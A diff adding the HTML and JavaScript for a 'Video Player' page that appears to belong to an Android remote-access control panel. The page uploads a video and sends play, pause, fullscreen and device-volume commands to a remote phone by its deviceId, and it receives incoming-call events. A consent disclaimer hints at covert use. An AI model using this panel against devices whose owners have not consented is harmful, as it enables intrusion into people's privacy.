@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Player - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-display) !important;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            width: 100%;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pg-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .btn-back {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn-back:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── CONTENT ── */
+        .vid-content {
+            max-width: 560px;
+            margin: 0 auto;
+        }
+
+        /* ── CARD ── */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .card-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 14px;
+        }
+
+        .card-label .cl-icon {
+            opacity: 0.5;
+        }
+
+        /* ── FILE DROP ── */
+        .file-drop-zone {
+            border: 2px dashed rgba(0, 255, 65, 0.15);
+            border-radius: 10px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+        }
+
+        .file-drop-zone:hover,
+        .file-drop-zone.dragover {
+            border-color: rgba(0, 255, 65, 0.4);
+            background: rgba(0, 255, 65, 0.03);
+        }
+
+        .file-drop-zone .drop-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            color: var(--accent);
+            opacity: 0.5;
+        }
+
+        .file-drop-zone .hint {
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        .file-info {
+            display: none;
+            background: rgba(0, 255, 65, 0.03);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin-bottom: 12px;
+            font-size: 0.65rem;
+        }
+
+        .file-info .name {
+            color: var(--accent);
+            font-weight: 600;
+            margin-bottom: 2px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .file-info .meta {
+            color: var(--text-muted);
+        }
+
+        /* ── UPLOAD PROGRESS ── */
+        .upload-progress {
+            display: none;
+            margin: 12px 0;
+        }
+
+        .upload-bar-track {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .upload-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00c8ff, var(--accent));
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.2s;
+        }
+
+        .upload-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: #00c8ff;
+            text-align: center;
+            margin-top: 4px;
+        }
+
+        /* ── CONTROLS ── */
+        .controls {
+            display: flex;
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .ctrl-btn {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 10px;
+            background: rgba(0, 255, 65, 0.05);
+            color: var(--accent);
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .ctrl-btn:hover:not(:disabled) {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: rgba(0, 255, 65, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .ctrl-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .ctrl-btn.stop-btn {
+            border-color: rgba(255, 60, 60, 0.2);
+            color: var(--danger);
+            background: rgba(255, 60, 60, 0.05);
+        }
+
+        .ctrl-btn.stop-btn:hover:not(:disabled) {
+            background: rgba(255, 60, 60, 0.1);
+            border-color: rgba(255, 60, 60, 0.35);
+        }
+
+        .ctrl-btn.active {
+            background: rgba(0, 255, 65, 0.12);
+            border-color: var(--accent);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.1);
+        }
+
+        /* ── PROGRESS ── */
+        .progress-container {
+            margin: 12px 0;
+        }
+
+        .progress-bar-track {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 3px;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #00e5ff);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .progress-labels {
+            display: flex;
+            justify-content: space-between;
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            margin-top: 6px;
+        }
+
+        /* ── SLIDER ── */
+        .slider-group {
+            margin-bottom: 12px;
+        }
+
+        .slider-label {
+            display: flex;
+            justify-content: space-between;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+
+        .slider-val {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            accent-color: var(--accent);
+            height: 4px;
+        }
+
+        /* ── TOGGLE ── */
+        .toggle-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+        }
+
+        .toggle-row .toggle-text {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 40px;
+            height: 22px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 11px;
+            transition: 0.3s;
+        }
+
+        .toggle-slider:before {
+            content: "";
+            position: absolute;
+            height: 16px;
+            width: 16px;
+            left: 3px;
+            bottom: 3px;
+            background: #555;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        .toggle-switch input:checked+.toggle-slider {
+            background: rgba(0, 255, 65, 0.25);
+        }
+
+        .toggle-switch input:checked+.toggle-slider:before {
+            transform: translateX(18px);
+            background: var(--accent);
+        }
+
+        /* ── STATUS ── */
+        .status-display {
+            text-align: center;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: var(--bg-card);
+        }
+
+        .status-state {
+            font-family: var(--font-display);
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--accent);
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .status-message {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+        }
+
+        .status-state.playing {
+            color: var(--accent);
+            animation: statusPulse 2s infinite;
+        }
+
+        .status-state.downloading {
+            color: #00c8ff;
+        }
+
+        .status-state.paused {
+            color: var(--warning);
+        }
+
+        .status-state.error {
+            color: var(--danger);
+        }
+
+        @keyframes statusPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 12px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        /* ── ANIMATIONS ── */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 12px;
+            }
+
+            .pg-header {
+                padding: 14px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.95rem;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 14px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .card {
+                padding: 16px;
+            }
+
+            .disc {
+                margin-top: 8px;
+                padding: 12px 14px;
+            }
+
+            .ft {
+                padding: 24px 12px;
+                margin-top: 20px;
+            }
+
+            .ft .ft-brand {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .pg-sub {
+                display: none;
+            }
+
+            .btn-back span {
+                display: none;
+            }
+
+            .card {
+                padding: 14px;
+            }
+
+            .ctrl-btn {
+                padding: 10px;
+                font-size: 0.6rem;
+            }
+
+            .ft {
+                padding: 20px 10px;
+                margin-top: 16px;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.9rem;
+            }
+
+            .ft .ft-copy {
+                font-size: 0.42rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .wrap {
+                padding: 8px;
+            }
+
+            .pg-header {
+                padding: 10px 12px;
+            }
+
+            .pg-icon {
+                width: 30px;
+                height: 30px;
+            }
+
+            .pg-title {
+                font-size: 0.85rem;
+            }
+
+            .card {
+                padding: 12px;
+                border-radius: 8px;
+            }
+
+            .disc {
+                padding: 10px 12px;
+                border-radius: 8px;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.85rem;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="clapperboard" style="width:20px;height:20px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Video</span> Player</div>
+                    <div class="pg-sub">// remote media playback</div>
+                </div>
+            </div>
+            <a href="javascript:window.history.back()" class="btn-back">
+                <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                <span>Back</span>
+            </a>
+        </div>
+
+        <div class="vid-content">
+
+            <!-- File Selection -->
+            <div class="card">
+                <div class="card-label">
+                    <i data-lucide="file-video" class="cl-icon" style="width:13px;height:13px;"></i>
+                    Select Video File
+                </div>
+                <div class="file-drop-zone" id="file-drop-zone"
+                    onclick="document.getElementById('video-file-input').click()">
+                    <div class="drop-icon"><i data-lucide="upload" style="width:24px;height:24px;"></i></div>
+                    <div>Click to select video file</div>
+                    <div class="hint">Supported native formats: MP4, WebM, 3GP</div>
+                </div>
+                <input type="file" id="video-file-input" accept="video/mp4,video/webm,.3gp"
+                    style="display:none">
+                <div class="file-info" id="file-info">
+                    <div class="name" id="file-name"></div>
+                    <div class="meta" id="file-meta"></div>
+                </div>
+
+                <!-- Upload Progress -->
+                <div class="upload-progress" id="upload-progress">
+                    <div class="upload-bar-track">
+                        <div class="upload-bar-fill" id="upload-bar-fill"></div>
+                    </div>
+                    <div class="upload-label" id="upload-label">Uploading...</div>
+                </div>
+            </div>
+
+            <!-- Controls -->
+            <div class="card">
+                <div class="card-label">
+                    <i data-lucide="sliders-horizontal" class="cl-icon" style="width:13px;height:13px;"></i>
+                    Controls
+                </div>
+                <div class="controls">
+                    <button class="ctrl-btn" id="btn-play" disabled onclick="playVideo()">
+                        <i data-lucide="play" style="width:14px;height:14px;"></i> Play
+                    </button>
+                    <button class="ctrl-btn" id="btn-pause" disabled onclick="pauseVideo()">
+                        <i data-lucide="pause" style="width:14px;height:14px;"></i> Pause
+                    </button>
+                    <button class="ctrl-btn stop-btn" id="btn-stop" disabled onclick="stopVideo()">
+                        <i data-lucide="square" style="width:14px;height:14px;"></i> Stop
+                    </button>
+                </div>
+                <div class="controls">
+                    <button class="ctrl-btn" id="btn-fullscreen" disabled onclick="toggleFullscreen()">
+                        <i data-lucide="maximize" style="width:14px;height:14px;"></i> Fullscreen
+                    </button>
+                </div>
+            </div>
+
+            <!-- Playback Progress -->
+            <div class="card">
+                <div class="card-label">
+                    <i data-lucide="bar-chart-3" class="cl-icon" style="width:13px;height:13px;"></i>
+                    Playback
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar-track" id="progress-track">
+                        <div class="progress-bar-fill" id="progress-fill"></div>
+                    </div>
+                    <div class="progress-labels">
+                        <span id="progress-current">0:00</span>
+                        <span id="progress-total">0:00</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Settings -->
+            <div class="card">
+                <div class="card-label">
+                    <i data-lucide="settings-2" class="cl-icon" style="width:13px;height:13px;"></i>
+                    Settings
+                </div>
+                <div class="slider-group">
+                    <div class="slider-label">
+                        <span>Volume</span>
+                        <span class="slider-val" id="vol-val">100%</span>
+                    </div>
+                    <input type="range" id="volume" min="0" max="100" value="100"
+                        oninput="document.getElementById('vol-val').textContent = this.value + '%'">
+                </div>
+                <div class="toggle-row">
+                    <span class="toggle-text">
+                        <i data-lucide="repeat" style="width:13px;height:13px;opacity:0.5;"></i>
+                        Loop Playback
+                    </span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="loop-toggle">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Status -->
+            <div class="status-display" id="status-display">
+                <div class="status-state" id="status-state">Idle</div>
+                <div class="status-message" id="status-message">Select a video file to get started</div>
+            </div>
+
+        </div> <!-- /vid-content -->
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:13px;height:13px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        // ========== STATE ==========
+        let selectedFile = null;
+        let uploadedTempFilename = null;
+        let uploadedOriginalName = null;
+        let isPlaying = false;
+        let isPaused = false;
+        let isFullscreen = true;
+        let wsConnection = null;
+
+        // ========== DOM REFS ==========
+        const fileDropZone = document.getElementById('file-drop-zone');
+        const fileInput = document.getElementById('video-file-input');
+        const fileInfo = document.getElementById('file-info');
+        const btnPlay = document.getElementById('btn-play');
+        const btnPause = document.getElementById('btn-pause');
+        const btnStop = document.getElementById('btn-stop');
+        const progressFill = document.getElementById('progress-fill');
+        const progressCurrent = document.getElementById('progress-current');
+        const progressTotal = document.getElementById('progress-total');
+        const uploadProgress = document.getElementById('upload-progress');
+        const uploadBarFill = document.getElementById('upload-bar-fill');
+        const uploadLabel = document.getElementById('upload-label');
+        const statusState = document.getElementById('status-state');
+        const statusMessage = document.getElementById('status-message');
+
+        // ========== FILE SELECTION ==========
+        fileDropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            fileDropZone.classList.add('dragover');
+        });
+        fileDropZone.addEventListener('dragleave', () => fileDropZone.classList.remove('dragover'));
+        fileDropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            fileDropZone.classList.remove('dragover');
+            const file = e.dataTransfer?.files?.[0];
+            if (file) loadFile(file);
+            else api.showToast('Please drop a video file', 'error');
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            const file = e.target.files?.[0];
+            if (file) loadFile(file);
+        });
+
+        function loadFile(file) {
+            // Validate file format for Android native MediaPlayer
+            const validTypes = ['video/mp4', 'video/webm'];
+            const validExts = ['.mp4', '.webm', '.3gp'];
+            const fileNameToLower = file.name.toLowerCase();
+            
+            const isValidExt = validExts.some(ext => fileNameToLower.endsWith(ext));
+            const isValidType = validTypes.includes(file.type) || file.type === ''; // type can be empty for unknown
+            
+            if (!isValidExt && !isValidType) {
+                api.showToast('Unsupported format. Please select MP4, WebM, or 3GP.', 'error');
+                return;
+            }
+
+            selectedFile = file;
+            uploadedTempFilename = null; // Reset — needs re-upload
+
+            const sizeMB = (file.size / 1024 / 1024).toFixed(1);
+            document.getElementById('file-name').textContent = file.name;
+            document.getElementById('file-meta').textContent = `${sizeMB} MB • ${file.type || 'video'}`;
+            fileInfo.style.display = 'block';
+            fileDropZone.innerHTML = '<div class="drop-icon"><i data-lucide="check-circle" style="width:24px;height:24px;color:var(--accent);"></i></div><div>File loaded — click to change</div>';
+            lucide.createIcons();
+
+            btnPlay.disabled = false;
+            updateStatus('ready', `Ready: ${escHtml(file.name)}`);
+        }
+
+        function escHtml(s) {
+            const d = document.createElement('div');
+            d.textContent = s;
+            return d.innerHTML;
+        }
+
+        // ========== UPLOAD ==========
+        async function uploadFile() {
+            if (!selectedFile) throw new Error('No file selected');
+
+            // If already uploaded, reuse
+            if (uploadedTempFilename) return;
+
+            // Wait for CSRF token initialization
+            await api.initPromise;
+
+            // Check if session is valid (csrfToken will be null if expired)
+            if (!api.csrfToken) {
+                window.location.href = '/login.html';
+                throw new Error('Session expired — please log in again');
+            }
+
+            uploadProgress.style.display = 'block';
+            uploadBarFill.style.width = '0%';
+            uploadLabel.textContent = 'Uploading...';
+
+            return new Promise((resolve, reject) => {
+                const formData = new FormData();
+                formData.append('file', selectedFile);
+
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `${window.location.origin}/api/admin-upload-temp`);
+                xhr.withCredentials = true;
+
+                if (window.api && window.api.csrfToken) {
+                    xhr.setRequestHeader('X-CSRF-Token', window.api.csrfToken);
+                }
+
+                xhr.upload.onprogress = (e) => {
+                    if (e.lengthComputable) {
+                        const pct = Math.round((e.loaded / e.total) * 100);
+                        uploadBarFill.style.width = pct + '%';
+                        uploadLabel.textContent = `Uploading: ${pct}%`;
+                    }
+                };
+
+                xhr.onload = () => {
+                    if (xhr.status === 200) {
+                        const data = JSON.parse(xhr.responseText);
+                        uploadedTempFilename = data.tempFilename;
+                        uploadedOriginalName = data.originalName;
+                        uploadProgress.style.display = 'none';
+                        resolve();
+                    } else if (xhr.status === 401) {
+                        // Session expired during upload — redirect to login
+                        uploadProgress.style.display = 'none';
+                        window.location.href = '/login.html';
+                        reject(new Error('Session expired — please log in again'));
+                    } else {
+                        uploadProgress.style.display = 'none';
+                        reject(new Error(`Upload failed: HTTP ${xhr.status}`));
+                    }
+                };
+
+                xhr.onerror = () => {
+                    uploadProgress.style.display = 'none';
+                    reject(new Error('Upload failed: network error'));
+                };
+
+                xhr.send(formData);
+            });
+        }
+
+        // ========== PLAY / PAUSE / STOP ==========
+        async function playVideo() {
+            if (isPaused) {
+                // Resume
+                try {
+                    await api.sendCommand(deviceId, 'video_resume');
+                    isPaused = false;
+                    isPlaying = true;
+                    updateButtons();
+                } catch (e) {
+                    api.showToast('Resume error: ' + e.message, 'error');
+                }
+                return;
+            }
+
+            try {
+                btnPlay.disabled = true;
+                updateStatus('uploading', 'Uploading to server...');
+
+                // Upload file first
+                await uploadFile();
+
+                updateStatus('sending', 'Sending to device...');
+
+                // Send play command
+                const volume = parseInt(document.getElementById('volume').value) / 100;
+                const loop = document.getElementById('loop-toggle').checked;
+
+                await api.sendCommand(deviceId, 'video_play', {
+                    tempFilename: uploadedTempFilename,
+                    originalName: uploadedOriginalName,
+                    volume,
+                    loop
+                });
+
+                isPlaying = true;
+                isPaused = false;
+                updateButtons();
+
+            } catch (e) {
+                api.showToast('Play error: ' + e.message, 'error');
+                updateStatus('error', 'Error: ' + e.message);
+                btnPlay.disabled = false;
+            }
+        }
+
+        async function pauseVideo() {
+            try {
+                await api.sendCommand(deviceId, 'video_pause');
+                isPaused = true;
+                updateButtons();
+            } catch (e) {
+                api.showToast('Pause error: ' + e.message, 'error');
+            }
+        }
+
+        async function stopVideo() {
+            try {
+                await api.sendCommand(deviceId, 'video_stop');
+                isPlaying = false;
+                isPaused = false;
+                isFullscreen = true;
+                progressFill.style.width = '0%';
+                progressCurrent.textContent = '0:00';
+                updateButtons();
+                updateStatus('stopped', 'Stopped');
+            } catch (e) {
+                api.showToast('Stop error: ' + e.message, 'error');
+            }
+        }
+
+        async function toggleFullscreen() {
+            try {
+                const newMode = !isFullscreen;
+                await api.sendCommand(deviceId, 'video_fullscreen', { fullscreen: newMode });
+                isFullscreen = newMode;
+                updateButtons();
+            } catch (e) {
+                api.showToast('Fullscreen error: ' + e.message, 'error');
+            }
+        }
+
+        // ========== UI HELPERS ==========
+        function updateButtons() {
+            btnPlay.disabled = !selectedFile || (isPlaying && !isPaused);
+            btnPlay.innerHTML = isPaused
+                ? '<i data-lucide="play" style="width:14px;height:14px;"></i> Resume'
+                : '<i data-lucide="play" style="width:14px;height:14px;"></i> Play';
+            btnPause.disabled = !isPlaying || isPaused;
+            btnStop.disabled = !isPlaying && !isPaused;
+            const btnFs = document.getElementById('btn-fullscreen');
+            btnFs.disabled = !isPlaying && !isPaused;
+            btnFs.innerHTML = isFullscreen
+                ? '<i data-lucide="minimize" style="width:14px;height:14px;"></i> Window'
+                : '<i data-lucide="maximize" style="width:14px;height:14px;"></i> Fullscreen';
+            lucide.createIcons();
+        }
+
+        function updateStatus(state, message) {
+            statusState.textContent = state.toUpperCase();
+            statusState.className = 'status-state ' + state;
+            if (message) statusMessage.textContent = message;
+        }
+
+        function formatTime(ms) {
+            const totalSec = Math.floor(ms / 1000);
+            const min = Math.floor(totalSec / 60);
+            const sec = totalSec % 60;
+            return `${min}:${String(sec).padStart(2, '0')}`;
+        }
+
+        // ========== WEBSOCKET — RECEIVE STATUS EVENTS ==========
+        function connectWS() {
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            wsConnection = new WebSocket(`${wsProtocol}//${location.host}`);
+
+            wsConnection.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+
+                    // Video status from device
+                    if (data.type === 'video_status' && data.deviceId === deviceId) {
+                        handleVideoStatus(data);
+                    }
+
+                    // Incoming call notification
+                    if (data.type === 'call_state' && typeof handleCallState === 'function') {
+                        handleCallState(data);
+                    }
+                } catch (e) { }
+            };
+
+            wsConnection.onclose = () => {
+                setTimeout(connectWS, 3000);
+            };
+
+            wsConnection.onerror = () => { };
+        }
+
+        function handleVideoStatus(data) {
+            const { state, position, duration, progress, message } = data;
+
+            // Update status display
+            if (state) updateStatus(state, message || state);
+
+            // Update progress bar
+            if (position !== undefined && duration !== undefined && duration > 0) {
+                const pct = (position / duration * 100).toFixed(1);
+                progressFill.style.width = pct + '%';
+                progressCurrent.textContent = formatTime(position);
+                progressTotal.textContent = formatTime(duration);
+            }
+
+            // Download progress
+            if (state === 'downloading' && progress !== undefined) {
+                progressFill.style.width = progress + '%';
+                progressCurrent.textContent = progress + '%';
+                progressTotal.textContent = '100%';
+            }
+
+            // Update play/pause/stop state
+            if (state === 'playing') {
+                isPlaying = true;
+                isPaused = false;
+                updateButtons();
+            } else if (state === 'paused') {
+                isPlaying = true;
+                isPaused = true;
+                updateButtons();
+            } else if (state === 'stopped' || state === 'completed' || state === 'error') {
+                isPlaying = false;
+                isPaused = false;
+                updateButtons();
+                if (state === 'completed') {
+                    progressFill.style.width = '100%';
+                }
+            }
+        }
+
+        // ========== INIT ==========
+        connectWS();
+
+        // Volume change — controls actual device volume + MediaPlayer level
+        let volDebounce = null;
+        document.getElementById('volume').addEventListener('input', function () {
+            const level = parseInt(this.value);
+            clearTimeout(volDebounce);
+            volDebounce = setTimeout(async () => {
+                try {
+                    // Set actual device media stream volume
+                    await api.sendCommand(deviceId, 'set_device_volume', { level, stream: 'music' });
+                    // Also set MediaPlayer volume if video is playing
+                    if (isPlaying) {
+                        await api.sendCommand(deviceId, 'video_volume', { volume: level / 100 });
+                    }
+                } catch (e) { }
+            }, 150);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (isPlaying) {
+                // Fire-and-forget stop
+                try {
+                    api.sendCommand(deviceId, 'video_stop').catch(() => { });
+                } catch (e) { }
+            }
+            if (wsConnection) wsConnection.close();
+        });
+    </script>
+</body>
+
+</html>
